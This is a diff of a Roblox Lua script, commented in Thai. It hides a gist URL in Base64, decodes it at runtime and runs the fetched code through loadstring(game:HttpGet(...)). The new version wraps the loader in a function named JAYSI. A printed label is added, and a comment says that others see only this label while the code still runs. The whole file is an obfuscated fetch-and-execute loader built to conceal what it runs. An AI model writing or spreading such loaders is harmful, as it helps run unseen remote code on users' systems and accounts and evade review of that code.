@@ -1,9 +1,11 @@
--- ฟังก์ชันซ่อน URL (Base64 encode)
-local function getURL()
-    local encoded = "aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vbGFyOTIwODUtYmVlcC80MjM2YTI0ZTNjOTliZWI3ZGZiMTZhMDdjYWZlZTVmNy9yYXcv" -- นี่คือ Base64 ของลิงก์ raw
+-- ฟังก์ชัน JAYSI() เป็นตัวรันสคริปต์
+function JAYSI()
+    -- URL จริงเข้ารหัส Base64
+    local encoded = "aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vbGFyOTIwODUtYmVlcC80MjM2YTI0ZTNjOTliZWI3ZGZiMTZhMDdjYWZlZTVmNy9yYXcv"
+    
+    -- ฟังก์ชัน decode Base64
     local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-    encoded = encoded:gsub('[^'..b..'=]', '')
-    return (encoded:gsub('.', function(x)
+    local decoded = (encoded:gsub('.', function(x)
         if x == '=' then return '' end
         local r,f='',(b:find(x)-1)
         for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
@@ -13,8 +15,10 @@ local function getURL()
         for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
         return string.char(c)
     end))
+    
+    -- โหลดสคริปต์จริง
+    loadstring(game:HttpGet(decoded))()
 end
 
--- โหลดสคริปต์จริงจาก URL ที่ซ่อน
-local url = getURL()
-loadstring(game:HttpGet(url))()
+-- คนอื่นเห็นแค่ข้อความนี้ แต่สามารถรันได้
+print("JAYSI")   -- แสดงข้อความให้เห็น
